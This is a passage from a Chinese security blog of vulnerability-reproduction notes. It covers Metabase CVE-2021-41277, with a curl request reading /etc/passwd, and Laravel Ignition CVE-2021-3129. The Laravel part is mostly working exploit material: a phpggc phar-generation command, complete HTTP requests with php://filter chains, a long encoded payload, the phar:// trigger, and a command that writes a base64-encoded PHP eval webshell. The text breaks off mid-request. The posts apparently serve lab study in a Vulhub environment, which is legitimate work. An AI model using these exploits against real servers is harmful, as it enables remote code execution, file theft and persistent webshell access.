    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/02/11/Metabase任意文件读取漏洞（CVE-2021-41277）/" itemprop="url">Metabase任意文件读取漏洞（CVE-2021-41277）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-02-11T22:00:01+08:00">
                2023-02-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Metabase任意文件读取漏洞（CVE-2021-41277）"><a href="#Metabase任意文件读取漏洞（CVE-2021-41277）" class="headerlink" title="Metabase任意文件读取漏洞（CVE-2021-41277）"></a>Metabase任意文件读取漏洞（CVE-2021-41277）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr" target="_blank" rel="noopener">https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr</a></li>
<li><a href="https://github.com/tahtaciburak/CVE-2021-41277" target="_blank" rel="noopener">https://github.com/tahtaciburak/CVE-2021-41277</a></li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metabase 0.40.0-0.40.4</span><br></pre></td></tr></table></figure>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码（自己设置），并且跳过后续的数据库填写的步骤即可完成安装：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215922566.png" alt="image-20230910215922566"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215943458.png" alt="image-20230910215943458"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910220202228.png" alt="image-20230910220202228"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/01/17/Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/01/17/Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）/" itemprop="url">Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-01-17T22:00:01+08:00">
                2023-01-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）"><a href="#Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）" class="headerlink" title="Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）"></a>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p>
<blockquote>
<p>Laravel Ignition 是一个强大的错误和异常处理工具，它能够提供更好的错误诊断和调试体验，为 Laravel 的错误页面提供了更友好和可读性更强的设计</p>
</blockquote>
<p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[&apos;viewFile&apos;]);   #序列化</span><br><span class="line">file_put_contents($parameters[&apos;viewFile&apos;], $contents);    #反序列化</span><br></pre></td></tr></table></figure>
<p>Laravel &lt;= 8.4.2 存在远程代码执行漏洞，当Laravel开启了Debug模式时，由于Laravel自带的2.5.2之前的Ignition功能的某些接口和函数存在过滤不严，未经过身份验证的远程攻击者可以发起恶意请求，通过<strong>构造恶意Log文件等方式触发phar反序列化，从而造成远程代码执行</strong>，控制服务器。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></li>
<li><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></li>
<li><a href="https://www.freebuf.com/vuls/280416.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/280416.html</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1797520" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1797520</a></li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Laravel&lt;=8.4.2</span><br><span class="line">Ignition&lt;2.5.2</span><br></pre></td></tr></table></figure>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个运行着Laravel 8.4.2和Ignition 2.5.1的应用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Laravel默认的欢迎页面。</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910194259406.png" alt="image-20230910194259406"></p>
<p>点击<strong>Generate app key</strong>生成应用程序密钥<br>至此环境搭建完成</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>想要利用该漏洞需要有几个步骤：</p>
<p>利用phpggc生成对应的phar文件→清空laravel.log → Log中增加前缀（填充字符，用于对齐），使得最终只出现一次 payload→将编码后的phar文件写入到log中→清除干扰字符→执行phar反序列化</p>
<p><strong>验证漏洞是否存在</strong></p>
<p>burpsuite抓取一个数据包，按照下图的形式修改并发送数据包</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910195124699.png" alt="image-20230910195124699"></p>
<p>页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p>
<p><strong>Laravel Debug mode RCE漏洞利用</strong></p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一、利用phpggc生成对应的phar文件</p>
<p>通过在laravel的依赖里面找一条能够rce的链，生成对应的phar文件，并将phar文件base64编码，再将该base64编码后的字符进行convert.quoted-printable-encode编码</p>
<p>工具下载地址：git clone <a href="https://github.com/ambionics/phpggc.git" target="_blank" rel="noopener">https://github.com/ambionics/phpggc.git</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">"phar.readonly=0"</span> ./phpggc/phpggc Laravel/RCE5 <span class="string">"phpinfo();"</span> --phar phar -o php:<span class="comment">//output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span></span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200353296.png" alt="image-20230910200353296"></p>
<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
<p><img src="https://img-blog.csdnimg.cn/dd8b1da0ee1046fb8a9ddb7a00e1c9be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>二、清空laravel.log</p>
<p>使用php://filter中的convert.base64-decode过滤器的特性，将log清空。</p>
<p>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200633460.png" alt="image-20230910200633460"></p>
<p>三、发送如下数据包，给Log增加一次前缀</p>
<blockquote>
<p><strong>如果出现两次 payload 或者出现部分残留的base64编码允许的字符将影响后续的base64解码</strong>。 可以通过在前后通过加填充字符的方式来调整 payload 的第一个字符下标为奇数 or 偶数，从而影响 utf16-&gt;utf8 的解码，来使得最终只出现一次 payload</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910200805099.png" alt="image-20230910200805099"></p>
<p>四、将编码后的字符写入到log中</p>
<p>将之前生成的编码后的POC作为viewFile的值，发送数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=48=00=4B=00=77=00=2F=00=57=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=44=00=33=00=75=00=36=00=2F=00=44=00=48=00=65=00=41=00=44=00=33=00=72=00=78=00=79=00=57=00=47=00=6E=00=46=00=34=00=6E=00=58=00=49=00=75=00=49=00=6D=00=43=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201007691.png" alt="image-20230910201007691"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201656301.png" alt="image-20230910201656301"></p>
<p>五、清空干扰字符只留下我们生成的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910201424924.png" alt="image-20230910201424924"></p>
<p><strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p>
<p>六、触发phar反序列化</p>
<p>使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 210</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",</span></span><br><span class="line"><span class="comment">  "parameters": &#123;</span></span><br><span class="line"><span class="comment">    "variableName": "username",</span></span><br><span class="line"><span class="comment">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202053862.png" alt="image-20230910202053862"></p>
<h4 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h4><p>我们可以利用该漏洞<strong>写入Webshell</strong>：</p>
<p>1.利用phpggc生成对应的phar文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&apos;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&apos;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&apos;&apos;.join([&apos;=&apos; + hex(ord(i))[2:] + &apos;=00&apos; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910202642109.png" alt="image-20230910202642109"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203108274.png" alt="image-20230910203108274"></p>
<p>重复上述利用步骤后，即可连接Webshell ！</p>
<p>2.清除laravel.log</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.给Log增加一次前缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>4.编码后的phar文件写入到log中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: 